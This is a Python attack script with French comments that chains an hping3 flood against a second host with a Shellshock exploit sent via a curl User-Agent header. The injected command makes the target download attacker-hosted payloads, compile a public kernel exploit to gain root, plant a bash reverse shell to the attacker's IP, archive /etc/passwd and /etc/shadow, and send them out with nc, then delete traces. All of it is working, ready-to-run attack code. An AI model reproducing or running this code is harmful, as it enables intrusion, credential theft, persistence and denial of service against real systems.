import threading
import os
import sys
ip_target1 = sys.argv[1]  #La cible
ip_target2 = sys.argv[2]  #La source depuis laquelle on va envoyer les paquets pour l'attaque par déni (une machine du réseau)
my_ip = sys.argv[3]		  #L'adresse ip de l'attaquant
port = sys.argv[4]		  #un port au choix qui doit être non utilisé et non bloqué par le parfeu



#Création d'un fichier dans le dossier html qui sera après chargé dans la machine cible
prep_file = open("/var/www/html/pw", "a+")

prep_file.write("""import os 
import sys

ip = sys.argv[1]
port = sys.argv[2]
path = \"\"\"echo "echo 'PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games' >> /etc/prog" | ./root 0\"\"\"
command =\"\"\"echo "echo 'bash -i >& /dev/tcp/\"\"\"+str(ip)+\"\"\"/\"\"\"+str(port)+\"\"\" 0>&1' >> /etc/prog" | ./root 0\"\"\"
command2 =\"\"\"echo "echo 'python /tmp/shadow \"\"\"+str(ip)+\"\"\" \"\"\"+str(port)+\"\"\" ' >> /etc/prog" | /tmp/root 0\"\"\"
create_data =\"\"\"echo "tar czp /etc/passwd /etc/shadow >> /tmp/data.in" | ./root 0\"\"\"  
delet = \"\"\"echo "echo 'sleep 3 && rm /tmp/shadow' >> /etc/prog" | /tmp/root 0\"\"\"
os.system(path)
os.system(create_data)
os.system(command2)
os.system(delet)
os.system(command)""")

prep_file.close()

#Création d'un deuxième fichier dans le dossier html qui sera aussi chargé dans la machine cible
shadow_file = open("/var/www/html/shadow", "a+")

shadow_file.write("""import os
import sys 
ip = sys.argv[1]
port = sys.argv[2]
command = \"\"\"echo "nc \"\"\"+str(ip)+\"\"\" \"\"\"+str(port)+\"\"\" < /tmp/data.in" | /tmp/root 0\"\"\"
os.system(command)""")

shadow_file.close()

#THREADS : afin de pouvoir exécuter plusieurs commands sur le même terminal en même temps (l'équivalant de & en bash)
class my_thread(threading.Thread):
	def __init__(self,command):
		threading.Thread.__init__(self)
		self.command = command
	def run(self):
		os.system(self.command)

#Attaque de saturation
flood = "hping3 --flood {} -1 -p {}".format(ip_target2,ip_target1)

#Exploitation du shellshock (vulnérabilité bash)
#Charger les fichiers depuis html dans la machine cible
#Charger l'exploit qui va nous permettre de devenir root
#l'exécution de fichier pw qu'on a chargé depuis la machine attaquant
#Se mettre à l'écoute afin de récupérer les data qui seront envoyées dans un deuxième temps
shellshock = """systemctl restart apache2 && curl -H "user-agent:() { :; }; echo; echo; /bin/bash -c 'cd /tmp && wget http://"""+str(my_ip)+"""/shadow && chmod +x shadow && wget http://"""+str(my_ip)+"""/pw && chmod +x pw  && wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/perf_swevent/perf_swevent64.c && export PATH=/usr/bin:$PATH && gcc perf_swevent64.c -O2 -o root && python pw """+str(my_ip)+""" """+str(port)+""" '" http://"""+str(ip_target1)+"""/cgi-bin/test && systemctl stop apache2 && ncat -l """+str(port)+""" > Data.out"""

#Instantiation deux deux threads
th1 = my_thread(flood)
th2 = my_thread(shellshock)

#Exécution des threads
th1.start()
th2.start()

#Retour au thread système 
th1.join()
th2.join()
 
